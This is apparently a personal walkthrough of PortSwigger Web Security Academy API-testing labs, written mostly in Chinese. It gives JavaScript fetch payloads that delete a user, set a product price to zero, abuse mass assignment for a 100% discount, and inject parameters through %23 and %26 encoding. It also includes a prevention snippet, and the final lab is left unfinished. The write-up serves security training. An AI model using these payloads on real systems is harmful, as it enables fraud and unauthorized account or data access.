---
title: API testing
description: API testing
---

## Lab: Exploiting an API endpoint using documentation

| Dimension | Description                                                                                      |
| --------- | ------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/api-testing#discovering-api-documentation                   |
| Lab       | https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation |

這題的 `/api` 有公開 API 文件

登入後

```js
fetch(`${location.origin}/api/user/carlos`, { method: "delete" });
```

成功解題～

## Lab: Finding and exploiting an unused API endpoint

| Dimension | Description                                                                         |
| --------- | ----------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/api-testing#identifying-api-endpoints          |
| Lab       | https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint |

這題算蠻明顯的(?)進入商品頁有戳 https://0adc005f04ac86ae83fb50b500350097.web-security-academy.net/api/products/1/price，嘗試構造

```js
fetch(
  "https://0adc005f04ac86ae83fb50b500350097.web-security-academy.net/api/products/1/price",
  {
    method: "patch",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ price: 0 }),
  },
);
```

## Lab: Exploiting a mass assignment vulnerability

| Dimension | Description                                                                                   |
| --------- | --------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/api-testing#mass-assignment-vulnerabilities              |
| Lab       | https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability |

這題我嘗試過 `/change-email` 搭配 `isAdmin`，也嘗試 PATCH https://0a37007203736e3f832506750093001f.web-security-academy.net/product?productId=1 都沒用

後來發現 `/api` 有公開 API 文件，嘗試

```js
fetch(`${location.origin}/api/checkout`, {
  method: "post",
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    chosen_products: [
      {
        product_id: "1",
        quantity: 1,
        item_price: 0,
      },
    ],
  }),
});
```

說錢錢不夠，之後嘗試

```js
fetch(`${location.origin}/api/checkout`, {
  method: "post",
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify({
    chosen_discount: { percentage: 100 },
    chosen_products: [
      {
        product_id: "1",
        quantity: 1,
      },
    ],
  }),
});
```

成功通關～果然有 API 文件就是舒服

## server-side parameter pollution in the query string

https://portswigger.net/web-security/api-testing/server-side-parameter-pollution?a=1#testing-for-server-side-parameter-pollution-in-the-query-string

1. 利用 (%23) # 截斷隱藏的 querystring

這裡很巧妙的利用了 URL encode 的技巧

假設 client 端送了 `GET /user?name=peter`

server 會再去戳一個 internal API `GET /users/search?name=peter&publicProfile=true`

那 client 端可以送 `GET /user?name=peter%23foo`

server 取得 searchParams.name 會拿到 `peter#foo`

```js
// 假設 server 是 NodeJS，使用 URLSearchParams 來解析 querystring
// 不管用什麼程式語言，核心概念是，解析時會經過一次 URL decode
new URLSearchParams(`name=peter%23foo`).get("name"); // peter#foo
```

server 再把 `peter#foo` 加到 internal API 的 querystring `GET /users/search?name=peter#foo&publicProfile=true`

```js
// 假設 server 是 NodeJS，使用 fetch 來發送 HTTP Request 到 internal api
// 不管用什麼程式語言，弱點在於，使用字串拼接 querystring
fetch(
  `http://internal.api.com/users/search?name=${new URLSearchParams(`name=peter%23foo`).get("name")}&publicProfile=true`,
);
```

這樣 URL fragment 就會被截斷，我們就可以成功把 `&publicProfile=true` 截斷，也許就可以取得非公開的使用者資訊

2. 利用 %26 (&) 注入新的 querystring

這裡也是很巧妙的利用了 URL encode 的技巧

假設 client 端送了 `GET /user?name=peter`

server 會再去戳一個 internal API `GET /users/search?name=peter`

那 client 端可以送 `GET /user?name=peter%26role=admin`

server 取得 searchParams.name 會拿到 `peter&role=admin`

```js
// 假設 server 是 NodeJS，使用 URLSearchParams 來解析 querystring
// 不管用什麼程式語言，核心概念是，解析時會經過一次 URL decode
new URLSearchParams(`name=peter%26role=admin`).get("name"); // peter&role=admin
```

server 再把 `peter&role=admin` 加到 internal API 的 querystring `GET /users/search?name=peter&role=admin`

```js
// 假設 server 是 NodeJS，使用 fetch 來發送 HTTP Request 到 internal api
// 不管用什麼程式語言，弱點在於，使用字串拼接 querystring
fetch(
  `http://internal.api.com/users/search?name=${new URLSearchParams(`name=peter%26role=admin`).get("name")}`,
);
```

這樣 URL searchParams 就會注入 `&role=admin`，也許就可以取得 admin 使用者資訊

3. How to prevent?

```js
const name = new URLSearchParams(`name=peter%26role=admin`).get("name");

// ❌，字串拼接
const vulnSearch = `name=${name}`; // name=peter&role=admin

// ✅，使用程式語言提供的 searchParams.set
const sp = new URLSearchParams();
sp.set("name", name);
const robustSearch = sp.toString(); // name=peter%26role%3Dadmin
```

## Lab: Exploiting server-side parameter pollution in a query string

| Dimension | Description                                                                                                                                      |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/api-testing/server-side-parameter-pollution#testing-for-server-side-parameter-pollution-in-the-query-string |
| Lab       | https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string  |

這題是 querystring 會吃到後面的那個

https://0ac200260456957680e71cd400bd0060.web-security-academy.net/product?productId=1&productId=2 實際上會去拿 productId=2

忘記密碼功能，觀察 forgotPassword.js

```js
forgotPwdReady(() => {
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);
  const resetToken = urlParams.get("reset-token");
  if (resetToken) {
    window.location.href = `/forgot-password?reset_token=${resetToken}`;
  } else {
    const forgotPasswordBtn = document.getElementById("forgot-password-btn");
    forgotPasswordBtn.addEventListener("click", displayMsg);
  }
});
```

嘗試訪問 https://0ac200260456957680e71cd400bd0060.web-security-academy.net/forgot-password?reset_token=1，只得到 `"Invalid token"`

這題我做到這邊就卡關了，後來是參考解答的步驟，但還是覺得有點牽強(?)

<!-- todo-yus 原理 -->

## 參考資料

- https://portswigger.net/web-security/api-testing
